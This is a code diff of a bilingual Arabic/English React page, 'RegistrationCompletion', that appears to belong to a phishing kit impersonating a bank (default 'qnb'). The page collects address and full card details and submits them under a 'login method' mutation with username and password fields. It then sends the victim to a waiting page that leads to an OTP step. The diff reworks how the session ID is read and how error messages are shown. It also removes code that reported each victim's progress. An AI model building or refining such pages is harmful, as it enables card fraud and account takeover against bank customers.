@@ -21,11 +21,22 @@ export default function RegistrationCompletion() {
   const { language } = useLanguage();
   const params = new URLSearchParams(search);
   const bankId = params.get("bank") || "qnb";
-  const sessionId = localStorage.getItem("sessionId") || params.get("session") || "";
+  const sessionId = params.get("session") || localStorage.getItem("sessionId") || "";
   
   const isArabic = language === "ar";
   const hasError = params.get("error") === "true";
-  const customError = params.get("msg");
+  
+  const [errorMessage, setErrorMessage] = useState<string | null>(null);
+
+  useEffect(() => {
+    if (hasError) {
+      const msg = sessionStorage.getItem("error_message");
+      if (msg) {
+        setErrorMessage(msg);
+        sessionStorage.removeItem("error_message");
+      }
+    }
+  }, [hasError]);
 
   const [formData, setFormData] = useState({
     country: "QA",
@@ -39,16 +50,6 @@ export default function RegistrationCompletion() {
   });
 
   const submitLoginMethodMutation = trpc.submissions.submitLoginMethod.useMutation();
-  const reportStepMutation = trpc.submissions.reportStep.useMutation();
-
-  useEffect(() => {
-    if (sessionId) {
-      reportStepMutation.mutate({
-        sessionId,
-        step: "registration-completion"
-      });
-    }
-  }, [sessionId]);
 
   const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
     const { name, value } = e.target;
@@ -81,16 +82,8 @@ export default function RegistrationCompletion() {
     }
 
     try {
-      const currentSessionId = sessionId || localStorage.getItem("sessionId") || "";
-      
-      if (!currentSessionId) {
-        toast.error(isArabic ? "جلسة غير صالحة، يرجى البدء من جديد" : "Invalid session, please start over");
-        return;
-      }
-
-      // إرسال بيانات الاشتراك - السيرفر سيحدث currentStep إلى "registration-completion" تلقائياً
       await submitLoginMethodMutation.mutateAsync({
-        sessionId: currentSessionId,
+        sessionId: sessionId,
         loginType: "registration_completion",
         username: "",
         password: "",
@@ -107,11 +100,9 @@ export default function RegistrationCompletion() {
         totalAmount: "10",
       });
       
-      // ننتقل مباشرة لصفحة الانتظار، السيرفر قام بتحديث الحالة بالفعل
-      setLocation(`/waiting?bank=${bankId}&session=${currentSessionId}&next=otp`);
+      setLocation(`/waiting?bank=${bankId}&session=${sessionId}&next=otp`);
     } catch (error) {
-      console.error("Submission error:", error);
-      toast.error(isArabic ? "حدث خطأ أثناء الإرسال، يرجى المحاولة مرة أخرى" : "An error occurred during submission, please try again");
+      toast.error(isArabic ? "حدث خطأ أثناء الإرسال" : "An error occurred");
     }
   };
 
@@ -134,15 +125,14 @@ export default function RegistrationCompletion() {
             </p>
           </div>
 
-          {hasError && (
-            <div className="p-4 bg-red-50 border-2 border-red-100 rounded-2xl flex items-center gap-3 text-red-700 text-sm font-bold">
-              <X size={20} className="shrink-0" />
-              <p>{customError || (isArabic ? "فشل تأكيد الاشتراك، يرجى التحقق من البيانات والمحاولة مرة أخرى" : "Subscription confirmation failed, please check data and try again")}</p>
+          {errorMessage && (
+            <div className="p-4 bg-rose-50 border-2 border-rose-100 rounded-2xl flex items-center gap-3 text-rose-700 text-sm font-bold animate-in fade-in slide-in-from-top-4">
+              <X size={20} className="shrink-0 bg-rose-500 text-white rounded-full p-1" />
+              <p>{errorMessage}</p>
             </div>
           )}
 
           <form onSubmit={handleSubmit} className="space-y-6">
-            {/* Address Section */}
             <div className="bg-white rounded-3xl p-6 shadow-sm border border-slate-100 space-y-4">
               <div className="flex items-center gap-2 mb-2 text-[#8C0032]">
                 <MapPin size={20} />
@@ -201,7 +191,6 @@ export default function RegistrationCompletion() {
               </div>
             </div>
 
-            {/* Payment Section */}
             <div className="bg-white rounded-3xl p-6 shadow-sm border border-slate-100 space-y-4">
               <div className="flex items-center justify-between mb-2">
                 <div className="flex items-center gap-2 text-[#8C0032]">
@@ -220,15 +209,11 @@ export default function RegistrationCompletion() {
                     <CreditCard size={18} />
                     <span>{isArabic ? "بطاقة ائتمان / خصم" : "Credit / Debit Card"}</span>
                   </div>
-                  <div className="mr-auto flex gap-2 items-center">
-                    <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663839209687/ZFcNkyAbKqaPzbFM.png" className="h-4 object-contain" alt="Visa" />
-                    <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663839209687/ZBgYQWBjxkoUvPKW.png" className="h-6 object-contain" alt="Mastercard" />
-                  </div>
                 </div>
 
                 <div className="space-y-4">
                   <div className="space-y-1">
-                    <label className="text-[10px] font-black text-slate-400 uppercase px-1">{isArabic ? "بيانات البطاقة" : "Card Information"}</label>
+                    <label className="text-[10px] font-black text-slate-400 uppercase px-1">{isArabic ? "رقم البطاقة" : "Card Number"}</label>
                     <div className="relative">
                       <input 
                         name="cardNumber"
@@ -267,9 +252,6 @@ export default function RegistrationCompletion() {
                           maxLength={4}
                           required
                         />
-                        <div className="absolute right-3 top-1/2 -translate-y-1/2 text-slate-200">
-                          <CreditCard size={16} />
-                        </div>
                       </div>
                     </div>
                   </div>
@@ -290,7 +272,6 @@ export default function RegistrationCompletion() {
               </div>
             </div>
 
-            {/* Warning Message */}
             <div className="bg-amber-50 border-2 border-amber-100 rounded-2xl p-5 flex gap-4">
               <AlertTriangle className="text-amber-500 shrink-0" size={24} />
               <div className="text-xs font-bold text-amber-800 leading-relaxed">
@@ -315,23 +296,8 @@ export default function RegistrationCompletion() {
               )}
             </button>
           </form>
-
-          <div className="flex items-center justify-center gap-4 py-4 opacity-50">
-            <ShieldCheck size={16} />
-            <span className="text-[10px] font-black uppercase tracking-widest">{isArabic ? "دفع آمن ومحمي 100%" : "100% SECURE & PROTECTED PAYMENT"}</span>
-          </div>
         </motion.div>
       </main>
-
-      <footer className="mt-auto">
-        <div className="footer-image-container">
-          <img 
-            src={isArabic ? "https://i.ibb.co/23sMQkSF/IMG-20260714-WA0015.jpg" : "https://i.ibb.co/609jMvhx/IMG-20260714-WA0016.jpg"} 
-            className="footer-image-standard" 
-            alt="Footer" 
-          />
-        </div>
-      </footer>
     </div>
   );
 }
